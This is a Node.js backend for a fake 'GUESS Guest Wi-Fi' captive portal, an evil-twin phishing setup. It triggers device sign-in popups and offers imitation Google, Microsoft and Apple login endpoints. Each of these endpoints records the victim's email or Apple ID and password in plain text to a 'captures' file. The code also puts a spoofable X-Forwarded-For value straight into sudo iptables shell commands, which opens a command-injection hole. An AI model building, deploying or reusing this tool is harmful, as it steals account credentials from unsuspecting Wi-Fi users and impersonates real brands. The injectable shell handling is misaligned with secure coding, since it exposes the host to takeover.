// GUESS Guest Wi-Fi captive portal - Node.js backend

const express    = require("express");
const bodyParser = require("body-parser");
const path       = require("path");
const fs         = require("fs");
const http       = require("http");
const { exec }   = require("child_process");

const app      = express();
const PORT     = 3000;
const LOG_FILE = "captures.txt";

const authorizedIps = new Set();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));


// Get the real client IP (strip the ::ffff: IPv4-mapped prefix if present)
function getClientIp(req) {
    let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    if (ip.startsWith("::ffff:")) ip = ip.slice(7);
    return ip;
}

// Append a capture entry to captures.txt and print to console
function logCapture(type, fields, ip) {
    const timestamp = new Date().toLocaleString("el-GR");
    let output = `\n[${timestamp}] ${type} - IP: ${ip}\n`;
    for (const key in fields) {
        output += `  ${key.padEnd(12)}: ${fields[key]}\n`;
    }
    output += "=".repeat(50) + "\n";
    console.log(output);
    fs.appendFile(LOG_FILE, output, () => {});
}

// Give a client internet access after they submit the form
function grantAccess(ip, res) {
    authorizedIps.add(ip);
    exec(`sudo iptables -t nat -I PREROUTING -s ${ip} -j RETURN`, (err) => {
        if (err) console.error("iptables NAT error:", err.message);
    });
    exec(`sudo iptables -I FORWARD -s ${ip} -j ACCEPT`, (err) => {
        if (err) console.error("iptables FORWARD error:", err.message);
        setTimeout(() => res.redirect("http://10.0.0.1/success"), 800);
    });
}


// Captive portal probe endpoints.
// Unauthenticated clients hit these (via iptables REDIRECT of port 80) and get
// a 302 back to our portal, which triggers the "Sign in to network" popup.
function redirectToPortal(req, res) {
    res.redirect(302, "http://10.0.0.1/");
}

// Android
app.get("/generate_204",      redirectToPortal);
app.get("/gen_204",           redirectToPortal);
app.get("/generate204",       redirectToPortal);
app.get("/mobile/status.php", redirectToPortal);
app.get("/connectivitycheck", redirectToPortal);

// iOS and macOS
app.get("/hotspot-detect.html",       redirectToPortal);
app.get("/library/test/success.html", redirectToPortal);
app.get("/success.html",              redirectToPortal);

// Windows
app.get("/connecttest.txt", redirectToPortal);
app.get("/ncsi.txt",        redirectToPortal);


// Portal page
app.get("/", (req, res) => res.sendFile(path.join(__dirname, "index.html")));


// Guest form submission
app.post("/connect", (req, res) => {
    const ip = getClientIp(req);
    logCapture("GUEST", {
        name:    req.body.name    || "(none)",
        email:   req.body.email,
        purpose: req.body.purpose || "(none)",
    }, ip);
    grantAccess(ip, res);
});

// Google sign-in submission
app.post("/auth/google", (req, res) => {
    const ip = getClientIp(req);
    logCapture("GOOGLE", {
        email:    req.body.email,
        password: req.body.password,
    }, ip);
    grantAccess(ip, res);
});

// Microsoft sign-in submission
app.post("/auth/microsoft", (req, res) => {
    const ip = getClientIp(req);
    logCapture("MICROSOFT", {
        email:    req.body.email,
        password: req.body.password,
    }, ip);
    grantAccess(ip, res);
});

// Apple sign-in submission
app.post("/auth/apple", (req, res) => {
    const ip = getClientIp(req);
    logCapture("APPLE", {
        apple_id: req.body.apple_id,
        password: req.body.password,
    }, ip);
    grantAccess(ip, res);
});


// Success page shown after a client is granted access
app.get("/success", (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connected - GUESS Guest Wi-Fi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .box {
            max-width: 380px;
            text-align: center;
        }
        .logo {
            display: block;
            margin: 0 auto 28px;
        }
        h1 {
            font-size: 22px;
            font-weight: 300;
            color: #000;
            letter-spacing: 3px;
            text-transform: uppercase;
            margin-bottom: 12px;
        }
        p {
            font-size: 14px;
            color: #666;
            line-height: 1.6;
        }
        .small {
            margin-top: 20px;
            font-size: 12px;
            color: #aaa;
        }
    </style>
</head>
<body>
    <div class="box">
        <svg class="logo" viewBox="0 0 120 104" width="84" height="72" xmlns="http://www.w3.org/2000/svg">
            <polygon points="60,4 116,100 4,100" fill="#cc0000"/>
            <text x="60" y="82" text-anchor="middle" fill="#ffffff"
                  font-family="Georgia, 'Times New Roman', serif" font-size="28"
                  font-style="italic" font-weight="bold">GUESS?</text>
        </svg>
        <h1>You're connected</h1>
        <p>You now have internet access through the GUESS guest network.</p>
        <p class="small">Redirecting...</p>
    </div>
    <script>
        setTimeout(function() { window.location.href = "https://www.google.com"; }, 3000);
    </script>
</body>
</html>`);
});


// Fallback - send any other request to the portal
app.use((req, res) => res.redirect(302, "http://10.0.0.1/"));


// Start the HTTP server
http.createServer(app).listen(PORT, () => {
    fs.appendFile(LOG_FILE, `\n--- Session started: ${new Date().toLocaleString("el-GR")} ---\n`, () => {});
    console.log(`Captive portal running on port ${PORT}`);
    console.log(`Captures file: ${path.resolve(LOG_FILE)}`);
});
